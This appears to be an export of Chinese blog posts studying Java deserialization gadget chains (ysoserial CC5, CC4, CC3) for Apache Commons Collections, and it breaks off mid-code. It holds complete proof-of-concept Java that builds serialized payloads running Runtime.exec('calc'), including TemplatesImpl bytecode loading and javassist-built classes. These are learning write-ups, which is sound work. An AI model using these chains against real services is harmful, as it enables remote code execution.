代码调试 在ysoserial链中，我们可以看见新利用到了一个类，BadAttributeValueExpException，这个类位于javax.management.BadAttributeValueExpException，\n这里需要知道一个知识点：如果一个类没有实现Serializable接口，但只要某个类的祖先类（父类、祖父类等）实现了Serializable接口，那么其所有子类也被认为是可序列化的。\nBadAttributeValueException类部分源码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 public class BadAttributeValueExpException extends Exception { private static final long serialVersionUID = -3105272988410493376L; private Object val; public BadAttributeValueExpException (Object val) { this.val = val == null ? null : val.toString(); } public String toString() { return \u0026#34;BadAttributeValueException: \u0026#34; + val; } private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get(\u0026#34;val\u0026#34;, null); if (valObj == null) { val = null; } else if (valObj instanceof String) { val= valObj; } else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) { val = valObj.toString(); } else { // the serialized object is from a version without JDK-8019292 fix val = System.identityHashCode(valObj) + \u0026#34;@\u0026#34; + valObj.getClass().getName(); } } } 虽然这个类没有实现Serializable接口，但是其父类Exception的父类Throwable实现了Serializable接口，所以BadAttributeValueException也是可以序列化的。\n个人思考 现在继续来看源码，我看到了这个类的构造方法： 这是一个三元操作符，如果val不为null，则返回val.toString()，既然这里是构造方法，我想到了CC3的利用方法，只要我们构造了val为我们设置好的TiedMapEntry类，那么我们是否能够成功调用。\n在CC3利用到了InstantiateTransformer类，那么在这里再尝试利用一下。\n想了一下，理论上应该是可以的，没得好大意义吗，因为最终在反序列化的时候还是需要调用其他类的readObject()，以CC3的HashMap为例，还是构建下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 package org.example; import javax.management.BadAttributeValueExpException; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javax.xml.transform.Templates; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] chainPart = new Transformer[]{new ConstantTransformer(TrAXFilter.class),new InstantiateTransformer(new Class[]{Templates.class},new Object[]{ctf})}; Transformer chain = new ChainedTransformer(chainPart); Map hash0 = new HashMap(); Map lazy0 = LazyMap.decorate(hash0,chain); TiedMapEntry haha0 = new TiedMapEntry(lazy0,\u0026#34;fupanc0\u0026#34;); Transformer[] realTransformer = new Transformer[]{new ConstantTransformer(BadAttributeValueExpException.class),new InstantiateTransformer(new Class[]{Object.class},new Object[]{haha0})}; Transformer outerMap = new ChainedTransformer(realTransformer); Map hash1 = new HashMap(); Map lazy1 = LazyMap.decorate(hash1,outerMap); TiedMapEntry haha1 = new TiedMapEntry(lazy1,\u0026#34;fupanc1\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(haha1,\u0026#34;xxxx\u0026#34;); //错误点 hash1.remove(\u0026#34;fupanc1\u0026#34;); hash0.remove(\u0026#34;fupanc0\u0026#34;); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 代码有问题，在运行后是成功在put部分弹出计算机，这说明代码逻辑应该没问题，并且跟源码发现前面确实在按预期走，在弹出计算机后在后面的InstantiateTransformer#transforme的catch的var6部分后一点突然结束了，导致程序直接结束，让后面的remove和序列化等操作都无法实现，有点怪，先遗留这个问题，等后面学深了再来想。\n除了上面无法全部运行的问题，还有看代码，其实可以说是多此一举了，定义了两个TiedMapEntry来实现，就简单了解一下就行了。\n现在来尝试解决一下，既然问题是在序列化的时候就弹出计算机，并且调试了一下，问题应该是在动态加载字节码这里，结合全部CC链的知识点，那么是否我们可以先假再真呢？\n尝试一下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 package org.example; import javax.management.BadAttributeValueExpException; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javax.xml.transform.Templates; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.map.LazyMap; import java.lang.reflect.Field; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] chainPart = new Transformer[]{new ConstantTransformer(TrAXFilter.class),new InstantiateTransformer(new Class[]{Templates.class},new Object[]{ctf})}; Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map hash0 = new HashMap(); Map lazy0 = LazyMap.decorate(hash0,chain); TiedMapEntry haha0 = new TiedMapEntry(lazy0,\u0026#34;fupanc0\u0026#34;); Transformer[] realTransformer = new Transformer[]{new ConstantTransformer(BadAttributeValueExpException.class),new InstantiateTransformer(new Class[]{Object.class},new Object[]{haha0})}; Transformer outerMap = new ChainedTransformer(realTransformer); Map hash1 = new HashMap(); Map lazy1 = LazyMap.decorate(hash1,outerMap); TiedMapEntry haha1 = new TiedMapEntry(lazy1,\u0026#34;fupanc1\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(haha1,\u0026#34;xxxx\u0026#34;); hash1.remove(\u0026#34;fupanc1\u0026#34;); hash0.remove(\u0026#34;fupanc0\u0026#34;); Field field1 = chain.getClass().getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 成功在反序列化时弹出计算机\n正式学习 继续看源码，我们看BadAttributeValueExpException的readObject()方法，这里也利用了toString()方法：\n看这个readObject()方法，valObj是从gf中的val参数获取的，而gf又是从反序列化流中读取的。所以我们只要控制了BadAttributeValueExpException类的val参数，就相当于控制了valObj，所以我们这里需要将val设置为TiedMapEntry类的实例。\n继续看代码，只要我们传入的val的值不是String类型，并且符合第三个条件中的的任意一个，就可以成功进入第三个条件的语句，从而可以执行TiedMapEntry类的toString()方法。\n在java中，Sysyem.getSecurityManager()的返回值默认是null，看如下测试语句：\n所以一般是可以进入到这个语句的。\n那么现在就差构造了，思路就是将一个设置好了的TiedMapEntry类传给val就行，结合前面学过的代码，可以先随便传，再反射修改即可，所以可以如下构造代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 package org.example; import javax.management.BadAttributeValueExpException; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Field; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(chainPart); Map hash = new HashMap(); Map lazy = LazyMap.decorate(hash,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); Object o = new BadAttributeValueExpException(null); Field x = BadAttributeValueExpException.class.getDeclaredField(\u0026#34;val\u0026#34;); x.setAccessible(true); x.set(o,outerMap); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } } 成功弹出计算机。\n同样的如果你想使用其他类型，比如结合动态加载字节码之类的，基本都是只用改一下chainPart那里的链就行。\n问题 子父类的序列化问题 ","date":"2025-01-22T13:56:03+08:00","permalink":"https://fupanc-w1n.github.io/p/cc5/","title":"CC5"},{"content":"CC4 ysoserial链中的CC4就只是将CC2使用的InvokerTransformer替换为InstantiateTransformer来加载字节码，具体使用CC3那里已经说过了。\n测试环境：\nJDK 8U411 commons-collections4.0 不多说，给个POC结束：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 package org.example; import java.util.PriorityQueue; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javax.xml.transform.Templates; import java.lang.reflect.Field; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(TrAXFilter.class),new InstantiateTransformer(new Class[]{Templates.class},new Object[]{ctf})}; Transformer chain = new ChainedTransformer(fakeTransformer); TransformingComparator comparator1 = new TransformingComparator(chain); PriorityQueue priority = new PriorityQueue(2,comparator1); priority.add(1); priority.add(1); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(priority); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 有点小怪的就是之弹出一个计算机，按照预期应该是两个的，调试器也有点小问题。\n补充 测试环境：\nJDK 8U411 commons-collections4.0 这里补充一个对PriorityQueue的替代链 TreeBag。\n直接上对类的分析\nTreeBag\u0026amp;TreeMap 在 CC2 中，使用了优先级队列 PriorityQueue 反序列化时会调用 comparator 的 compare 方法的特性，配合 TransformingComparator 触发 transformer。\n在这里TreeBag也实现了在反序列化时会调用到比较器，所以这里也可以利用。\nTreeBag类位于org.apache.commons.collections4.bag.TreeBag\n稍微说明一下Bag：\nBag 接口继承自 Collection 接口，定义了一个集合，该集合会记录对象在集合中出现的次数。它有一个子接口 SortedBag，定义了一种可以对其唯一不重复成员排序的 Bag 类型。\nTreeBag 是对 SortedBag 的一个标准实现。TreeBag 使用 TreeMap 来储存数据，并使用指定 Comparator 来进行排序。\n————\nTreeBag 类继承自 AbstractMapBag，实现了 SortedBag 接口。初始化 TreeBag 时，会创建一个新的 TreeMap 储存在AbstractMapBag的成员变量 map 里，而排序使用的 Comparator 则直接储存在 TreeMap 中：\nTreeBag类构造方法：\n父类AbstractMapBag：\nTreeMap定义有comparator：\n当对TreeBag反序时： 可以看出这里会读取TreeMap的comparator并调用父类AbstractMapBag的doReadObject()方法： 这里会调用map.put()，也就是TreeMap的put方法： 看我标重点部分，在前面的简单过程中，这里会进入if条件很正常（并且利用点就是这里，至于为什么后面再说明），这里就会执行compare方法，看一下TreeMap类的compare()方法： 只要我们正确定义了comparator就可以成功执行漏洞。\n链子不就出来了吗。\n两个点需要说明 第一个 1.父类AbstractMapBag的变量map不可被序列化：\n解决方法同样是在TreeBag的writeObject()以及readObject()方法中： writeObject()： 继续跟进this.comparator()： 然后到会到父类AbstractMapBag的getMap()方法： 返回了我们定义的TreeMap实例，所以前面的comparator()中会调用TreeMap类的comparator()： 直接返回了我们定义的comparator。所以序列化的时候会序列化我们定义的comparator：\n——\n那么看反序列化： 所以这里又将这个comparator反序列化了出来。\n那么这样过后就可以解决transient问题。\n第二个 2.也就是for循环不能进去的问题： 想要进入for循环，这里与entrySize()有关，而entrySize的值又与in.readInt()有关。\n此时同样需要看TreeBag的writeObject()方法，前面还没有分析完：\n这里在序列化的时候同样要进入父类一次，AbstractMapBag的doWriteObject()方法如下： 一眼出来，就是和这里的writeInt()有关，而writeInt()又与TreeMap的size()函数有关： 此时想到了前面cc2对这个size的描述，直接猜一波和add()相干，TreeMap有add方法，但是还是相当于直接调用的父类AbstractMapBag的add()方法： 里面会调用TreeMap的get()方法： 这里也就是看是否有值，很显然我们并没有往里面传过值，那么mut就为null，这样就进入TreeMap类的put()方法：\n再看put方法源码： 这里很自然就会使得size为1。\n——————\n但是这里需要注意会调用compare()方法，前面也说过这个方法了，如果没有设置假的话应该会导致弹两个计算机，测试一下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package org.example; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.bag.TreeBag; public class Main{ public static void main(String[] args) throws Exception { Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(chainPart); TransformingComparator comparator1 = new TransformingComparator(chain); TreeBag treeBag = new TreeBag(comparator1); treeBag.add(\u0026#34;fupanc\u0026#34;,1); } } 成功按照预期弹了两个计算机。想法成立。\n但是在前面基本流程讲解的过程中，遗留了一个问题，在反序列化时，目的同样是调用这个put()方法： 所以说会进入TreeMap类的put()方法：\n重点其实也标注出来了，主义看前面序列化之前会调用这个put()方法，在这个put()方法中将root变量赋值了，这就让root不再是一个空值，那么在反序列化时为什么可以进入呢，其实还是因为root被transient关键字修饰了，导致不能被序列化，故而在反序列化时也可以进入这个if条件，从而成功调用compare()方法。\n——————\nOK，那么就通了，只要这里size为1就可以成功使得this.map.size()返回1，这样序列化的时候就可以序列化1了，反序列化读取的时候也不是0了，从而成功可以进入for循环。\n条件基本都说明了，直接上代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 package org.example; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.Transformer; import java.lang.reflect.Field; import org.apache.commons.collections4.bag.TreeBag; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); TransformingComparator comparator1 = new TransformingComparator(chain); TreeBag treeBag = new TreeBag(comparator1); treeBag.add(\u0026#34;fupanc\u0026#34;,1); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(treeBag); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } 成功弹出预期的两个计算机\njavassist补充 那么同样的利用javassist也是可行的，就是注意一下前面说的需要关注compare的值： 前面的理论过程懂了的话就基本没有问题了，就是下面的key需要为TemplatesImpl类实例： 这里同样需要注意add()时弹出计算机的问题，直接在下面的POC一并解决了\n可以构造如下POC：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 package org.example; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.bag.TreeBag; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception{ Constructor constructor = Class.forName(\u0026#34;org.apache.commons.collections4.functors.InvokerTransformer\u0026#34;).getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\u0026#34;newTransformer\u0026#34;); TransformingComparator comparator1 = new TransformingComparator(transformer); TreeBag treeBag = new TreeBag(comparator1); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\u0026#34;Cat\u0026#34;); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc.exe\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \u0026#34;EvilCat\u0026#34; + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); treeBag.add(templates,1); ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); outputStream.writeObject(treeBag); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); inputStream.readObject(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 弹出两个计算机，还是算预期的，add一次，反序列化一次，和CC2那里是有区别的，调试了一下好像是在第一次成功调用transform后抛出异常，导致不能调用到第二个transform。\n但是这里同样需要注意add时会调用一次，会先弹一次计算机，所以还是先假再反射更改来防止序列化前弹。\n所以最终POC为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 package org.example; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.bag.TreeBag; import java.lang.reflect.Field; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception{ ConstantTransformer fakeTransformer = new ConstantTransformer(1); Constructor constructor = Class.forName(\u0026#34;org.apache.commons.collections4.functors.InvokerTransformer\u0026#34;).getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\u0026#34;newTransformer\u0026#34;); TransformingComparator comparator1 = new TransformingComparator(fakeTransformer); TreeBag treeBag = new TreeBag(comparator1); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\u0026#34;Cat\u0026#34;); String cmd = \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc.exe\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \u0026#34;EvilCat\u0026#34; + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); treeBag.add(templates,1); Field field1 = TransformingComparator.class.getDeclaredField(\u0026#34;transformer\u0026#34;); field1.setAccessible(true); field1.set(comparator1,transformer); ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); outputStream.writeObject(treeBag); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); inputStream.readObject(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 成功弹出预期的一个计算机，但是不知道为啥这里能直接反射修改final修饰的transformer，正常应该是：\n1 2 3 4 5 6 7 8 import java.lang.reflect.Modifier; Field field1 = TransformingComparator.class.getDeclaredField(\u0026#34;transformer\u0026#34;); field1.setAccessible(true); Field modifiersField = Field.class.getDeclaredField(\u0026#34;modifiers\u0026#34;); modifiersField.setAccessible(true); modifiersField.setInt(field1, field1.getModifiers() \u0026amp; ~Modifier.FINAL); field1.set(comparator1,transformer); OK，链子完结了。\n","date":"2025-01-22T13:52:14+08:00","permalink":"https://fupanc-w1n.github.io/p/cc4/","title":"CC4"},{"content":"CC3 CC3就是将CC1和CC6调用链和动态加载字节码加在一起，所以需要有动态加载字节码的知识。\n利用TemplatesImpl构造CC3 在前面博客的文章中，讲述了Java中动态加载字节码的方法，其中就说明了TemplatesImpl的用法，通过调用其newTransformer()来实现链子的起点\n在动态加载字节码中，利用TemplatesImpl构建的POC为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Base64; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Base64.getDecoder().decode(\u0026#34;xxx\u0026#34;); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ctf.newTransformer(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 恶意类的示例代码为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import java.io.IOException; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Test extends AbstractTranslet { public Test() throws IOException { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } 想要在反序列化中利用TemplatesImpl来加载字节码，需要在反序列化中执行TemplatesImpl对象的newTransformer或getOutputProperties方法\n结合在CC1中的TransformedMap链的基本代码的简化代码，可以如下构造：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Base64; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import 